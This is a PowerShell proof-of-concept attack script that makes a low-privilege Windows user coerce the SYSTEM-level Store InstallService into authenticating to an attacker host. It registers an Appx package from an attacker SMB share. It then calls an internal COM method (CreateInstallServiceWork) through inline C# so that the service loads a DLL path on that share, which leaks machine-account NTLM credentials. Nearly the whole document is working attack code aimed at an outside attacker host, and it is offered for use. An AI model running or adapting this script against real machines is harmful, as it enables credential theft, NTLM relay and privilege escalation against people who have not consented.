<#
    Invoke-InstallServiceCoerce.ps1

    Usage (on target, as the logged-on low-priv user):
      powershell -ExecutionPolicy Bypass -File .\Invoke-InstallServiceCoerce.ps1 -AttackerHost 192.168.139.132 -Share coerce
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)] [string]$AttackerHost,
    [string]$Share = "coerce",
    [string]$ManifestName = "AppxManifest.xml"
)

$ErrorActionPreference = 'Stop'
$manifestUnc = "\\$AttackerHost\$Share\$ManifestName"
$probeUnc    = "\\$AttackerHost\$Share\InstallServicePlugin.dll"   # never has to exist

$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$pr = New-Object Security.Principal.WindowsPrincipal($id)
Write-Host "[*] User    : $($id.Name)"
Write-Host "[*] Elevated: $($pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"
Write-Host "[*] Manifest: $manifestUnc"

# --- 1. Register the UNC-located package (non-admin, per-user) ---------------
Write-Host "[1] Registering loose package from UNC ..."
Get-AppxPackage -Name DiscCoerceProbe | Remove-AppxPackage -ErrorAction SilentlyContinue
Add-AppxPackage -Register $manifestUnc
$pkg = Get-AppxPackage -Name DiscCoerceProbe
if (-not $pkg) { throw "registration produced no package" }
Write-Host "    PFN = $($pkg.PackageFamilyName)"
Write-Host "    InstalledLocation = $($pkg.InstallLocation)"
if ($pkg.InstallLocation -notlike "\\*") {
    Write-Warning "InstalledLocation is not a UNC - the coercion will not fire. Check the NTFS-reporting share."
}

# --- 2. Trigger CreateInstallServiceWork with the package PFN ----------------
$cs = @"
using System; using System.Runtime.InteropServices;
public static class ISC {
  [DllImport("combase.dll")] static extern int RoInitialize(int t);
  [DllImport("combase.dll")] static extern void RoUninitialize();
  [DllImport("combase.dll",CharSet=CharSet.Unicode)] static extern int WindowsCreateString(string s,int l,out IntPtr h);
  [DllImport("combase.dll")] static extern int WindowsDeleteString(IntPtr h);
  [DllImport("combase.dll")] static extern int RoActivateInstance(IntPtr cls,out IntPtr obj);
  [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int QI(IntPtr s,ref Guid i,out IntPtr p);
  [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint Rel(IntPtr s);
  [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int CW(IntPtr s,IntPtr a,IntPtr b,IntPtr c,IntPtr d,IntPtr e,IntPtr f,out IntPtr v);
  static IntPtr HS(string s){IntPtr h;WindowsCreateString(s==null?"":s,(s==null?"":s).Length,out h);return h;}
  static U VT<U>(IntPtr o,int s) where U:class{var v=Marshal.ReadIntPtr(o);return Marshal.GetDelegateForFunctionPointer(Marshal.ReadIntPtr(v,s*IntPtr.Size),typeof(U)) as U;}
  static void R(IntPtr p){if(p!=IntPtr.Zero)VT<Rel>(p,2)(p);}
  static string J(string s){return "\"" + (s==null?"":s).Replace("\\","\\\\").Replace("\"","\\\"") + "\"";}
  // Activate the internal Store install-control class and call slot 8 (CreateInstallServiceWork)
  public static string Run(string pfn,string unc){
    RoInitialize(1);
    IntPtr cls=HS("Windows.Internal.InstallService.Control.InstallServiceControl");
    IntPtr obj=IntPtr.Zero,ctl=IntPtr.Zero,view=IntPtr.Zero;
    try{
      if(RoActivateInstance(cls,out obj)<0)return "ActivateFail";
      var iid=new Guid("e4893a99-9270-42b9-9a62-683d6ceed250");
      if(VT<QI>(obj,0)(obj,ref iid,out ctl)<0)return "QIFail";
      string props="{"+
        "\"SkipCatalogLookup\":true,"+
        "\"SourceUri\":"+J(unc)+","+
        "\"ProductId\":\"coerce\",\"SkuId\":\"0001\","+
        "\"PackageFamilyName\":"+J(pfn)+","+
        "\"FulfillmentPluginId\":"+J(pfn)+","+
        "\"Market\":\"US\"}";
      IntPtr hcv=HS("isc"),hca=HS(""),h3=HS(""),h4=HS(""),hp=HS(props),ho=HS("{}");
      int hr=VT<CW>(ctl,8)(ctl,hcv,hca,h3,h4,hp,ho,out view);
      foreach(var h in new[]{hcv,hca,h3,h4,hp,ho})WindowsDeleteString(h);
      return "CreateInstallServiceWork=0x"+hr.ToString("X8");
    } finally { R(view);R(ctl);R(obj);WindowsDeleteString(cls);RoUninitialize(); }
  }
}
"@
Add-Type -TypeDefinition $cs
Write-Host "[2] Triggering CreateInstallServiceWork (FulfillmentPluginId = $($pkg.PackageFamilyName)) ..."
$res = [ISC]::Run($pkg.PackageFamilyName, $probeUnc)
Write-Host "    $res"
Write-Host "[+] InstallService (SYSTEM) now LoadLibraryW's $probeUnc -> machine-account NTLM."
